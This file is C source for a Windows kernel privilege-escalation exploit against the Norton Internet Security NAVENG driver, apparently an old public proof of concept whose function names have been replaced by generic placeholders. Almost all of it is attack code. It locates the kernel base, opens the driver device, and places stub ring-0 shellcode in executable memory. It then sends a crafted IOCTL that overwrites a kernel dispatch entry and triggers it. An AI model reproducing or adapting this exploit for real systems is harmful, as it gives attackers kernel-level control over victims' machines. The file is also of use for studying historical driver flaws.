#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  arrMods ;
typedef  int /*<<< orphan*/  Ring0ShellCode ;
typedef  int /*<<< orphan*/  (* PGETDEVNAME ) (int,char*,int) ;
typedef  int /*<<< orphan*/  (* PENUMDEVICES ) (int*,int,int*) ;
typedef  int LPVOID ;
typedef  scalar_t__ HANDLE ;
typedef  int DWORD ;
typedef  char CHAR ;
typedef  int /*<<< orphan*/  BOOL ;

/* Variables and functions */
 int /*<<< orphan*/  FUNC0 (scalar_t__) ; 
 scalar_t__ FUNC1 (char*,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ *,int,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC2 (scalar_t__,int,int,int /*<<< orphan*/ ,int,int,int*,int /*<<< orphan*/ *) ; 
 scalar_t__ FUNC3 (int /*<<< orphan*/ ,char*) ; 
 scalar_t__ INVALID_HANDLE_VALUE ; 
 int /*<<< orphan*/  FUNC4 (char*) ; 
 int MAX_PATH ; 
 int MEM_COMMIT ; 
 int MEM_RESERVE ; 
 int /*<<< orphan*/  PAGE_EXECUTE_READWRITE ; 
 int /*<<< orphan*/  FUNC5 () ; 
 int /*<<< orphan*/  FUNC6 (int) ; 
 scalar_t__ FUNC7 (int,int,int,int /*<<< orphan*/ ) ; 
 int W2K_SWITCH ; 
 int WXP_SWITCH ; 
 int /*<<< orphan*/  FUNC8 (int) ; 
 int /*<<< orphan*/  FUNC9 (int*) ; 
 int /*<<< orphan*/  FUNC10 (int,int,int) ; 
 int /*<<< orphan*/  FUNC11 (char*,...) ; 
 scalar_t__ FUNC12 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC13 (char*) ; 

int FUNC14(int argc, char *argv[])
{

 DWORD				*OutBuff,*InBuff,*ShellAddr;			
 DWORD				dwIOCTL,OutSize,InSize,junk,cb,devNum,i,Ring0Addr;
 HANDLE				hDevice;
 PENUMDEVICES pEnumDeviceDrivers;
 PGETDEVNAME  pGetDeviceDriverBaseName;
 LPVOID arrMods[200],addEx;
 DWORD BaseNt=0,BaseAuxNt;
 BOOL InXP;
 CHAR baseName[MAX_PATH];
 
 //"PUT YOUR RING0 CODE HERE "
 unsigned char Ring0ShellCode[]="\xcc\x90\x90\x90";       
 
  FUNC13("cls");
 
  FUNC11("\n################################\n");
  FUNC11("## Norton I.S                 ##\n");
  FUNC11("## Ring0 Exploit              ##\n");
  FUNC11("################################\n");
  FUNC11("\nRuben Santamarta\nwww.reversemode.com\n\n");
  
 if(argc<2)
 {
  
 
  FUNC11("\nusage> exploit.exe <XP> or <2K>\n");
  FUNC8(1);
 }
 

 pEnumDeviceDrivers=(PENUMDEVICES)FUNC3(FUNC4("psapi.dll"),
												 "EnumDeviceDrivers");

 pGetDeviceDriverBaseName=(PGETDEVNAME)FUNC3(FUNC4("psapi.dll"),
												 "GetDeviceDriverBaseNameA");

 pEnumDeviceDrivers(arrMods,sizeof(arrMods),&cb);
 devNum=cb/sizeof(LPVOID);
 FUNC11("\n[!] Searching Ntoskrnl.exe Base Address...");

 for(i=0;i<=devNum;i++)
 {
       pGetDeviceDriverBaseName(arrMods[i],baseName,MAX_PATH);
	   if((FUNC12(baseName,"ntoskr",6)==0))
	   {
	  	   FUNC11("[%x] Found!\n",arrMods[i]);
		   BaseNt = (DWORD)arrMods[i];
		   BaseAuxNt = BaseNt;
	   }
 }
 
if (!BaseNt) 
{
   FUNC11("!!? ntoskrnl.exe base address not found\nexiting\n\n");
   FUNC8(0);
}


//////////////////////
///// CASE 'DosDevice'
//////////////////////

hDevice = FUNC1("\\\\.\\NAVENG",
                     0,
                     0,
                     NULL,
                     3,
                     0,
                     0);

//////////////////////
///// INFO 
//////////////////////
 if (hDevice == INVALID_HANDLE_VALUE) FUNC5();
 
 FUNC11("\n\n** Initializing Exploit]\n\n");
 FUNC11("INFORMATION \n");
 FUNC11("-----------------------------------------------------\n");
 FUNC11("[!] NAVENG Device Handle [%x]\n",hDevice);
 

 

 //////////////////////
 ///// IOCTL
 //////////////////////
 OutSize = 4;
 dwIOCTL = 0x222AD3;
 
 
 if(FUNC12(argv[1],"XP",2)==0)  Ring0Addr = BaseNt + WXP_SWITCH;
 else                            Ring0Addr = BaseNt + W2K_SWITCH;

 FUNC11("[!] Overwriting NtQuerySystemInformation Switch at [0x%x]\n",Ring0Addr);

 ShellAddr=(DWORD*)FUNC7((LPVOID)0x2000000
                                ,0xF000
                                ,MEM_COMMIT|MEM_RESERVE
                                ,PAGE_EXECUTE_READWRITE);
 
 
 for(i=1;i<0x3C00;i++) ShellAddr[i]=(DWORD)ShellAddr; // paged out
 FUNC10((LPVOID)ShellAddr,(LPVOID)Ring0ShellCode,sizeof(Ring0ShellCode));
 
 FUNC11("\n\n\t\t[!] Initializing Countdown,last chance to abort.");
 
 for(i=10;i>=1;i--)
 {
   FUNC11("\r -[ %d ]- ",i);
   if(i==1) FUNC11("\n\n[*] Executing ShellCode");
   FUNC6(1000);
 }      
         
 FUNC2(hDevice, 
                 dwIOCTL, 
                 (LPVOID)0,0,
                 (LPVOID)Ring0Addr,OutSize,
                 &junk,  
                 NULL);
                 
 FUNC13("dir");  // NtQuerySystemInformation Nasty Hack ;
 
 /////////////////////
 ///// CLeanUp
 /////////////////////
 
 FUNC0(hDevice);
 FUNC9(ShellAddr);
 
 FUNC11("\n\n[*] Exploit terminated\n\n");
 return 0;
}